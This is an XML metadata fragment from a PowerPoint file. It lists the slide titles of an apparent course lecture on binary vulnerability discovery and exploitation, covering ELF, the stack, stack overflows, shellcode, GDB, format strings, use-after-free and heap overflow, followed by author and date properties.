      <vt:lpstr>X86汇编模型</vt:lpstr>
      <vt:lpstr>ELF格式</vt:lpstr>
      <vt:lpstr>ELF Header</vt:lpstr>
      <vt:lpstr>Section Header Table</vt:lpstr>
      <vt:lpstr>Program Header Table</vt:lpstr>
      <vt:lpstr>栈（Stack）</vt:lpstr>
      <vt:lpstr>栈与函数调用</vt:lpstr>
      <vt:lpstr>整数寄存器（IA32）</vt:lpstr>
      <vt:lpstr>call/ret - 函数调用/返回</vt:lpstr>
      <vt:lpstr>Intel &amp; AT&amp;T</vt:lpstr>
      <vt:lpstr>调用约定（Calling Convention）</vt:lpstr>
      <vt:lpstr>内存分布(Linux X86)</vt:lpstr>
      <vt:lpstr>栈帧结构</vt:lpstr>
      <vt:lpstr>X86-64寄存器</vt:lpstr>
      <vt:lpstr>栈溢出</vt:lpstr>
      <vt:lpstr>栈溢出样例程序</vt:lpstr>
      <vt:lpstr>栈溢出利用(Exploit)</vt:lpstr>
      <vt:lpstr>栈溢出利用(Exploit)</vt:lpstr>
      <vt:lpstr>栈溢出利用(Exploit)</vt:lpstr>
      <vt:lpstr>栈溢出利用(Exploit)</vt:lpstr>
      <vt:lpstr>Shellcode</vt:lpstr>
      <vt:lpstr>Shellcode</vt:lpstr>
      <vt:lpstr>Shellcode &amp; setuid</vt:lpstr>
      <vt:lpstr>Shellcode</vt:lpstr>
      <vt:lpstr>GDB</vt:lpstr>
      <vt:lpstr>GDB</vt:lpstr>
      <vt:lpstr>GDB</vt:lpstr>
      <vt:lpstr>GDB</vt:lpstr>
      <vt:lpstr>GDB</vt:lpstr>
      <vt:lpstr>GDB</vt:lpstr>
      <vt:lpstr>整数溢出</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>格式化字符串</vt:lpstr>
      <vt:lpstr>Vulnerable Functions</vt:lpstr>
      <vt:lpstr>一些特殊的占位符</vt:lpstr>
      <vt:lpstr>Example</vt:lpstr>
      <vt:lpstr>泄露内存&amp;崩溃</vt:lpstr>
      <vt:lpstr>修改内存</vt:lpstr>
      <vt:lpstr>修改内存</vt:lpstr>
      <vt:lpstr>修改内存</vt:lpstr>
      <vt:lpstr>Where to write?</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>释放后使用（Use After Free）</vt:lpstr>
      <vt:lpstr>堆溢出</vt:lpstr>
      <vt:lpstr>作业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二进制程序漏洞挖掘与利用</dc:title>
  <dc:creator>kelwin</dc:creator>
  <cp:lastModifiedBy>Microsoft Office User</cp:lastModifiedBy>
  <cp:revision>186</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2014-11-04T07:08:01Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2015-10-29T02:02:47Z</dcterms:modified>
</cp:coreProperties>
</file>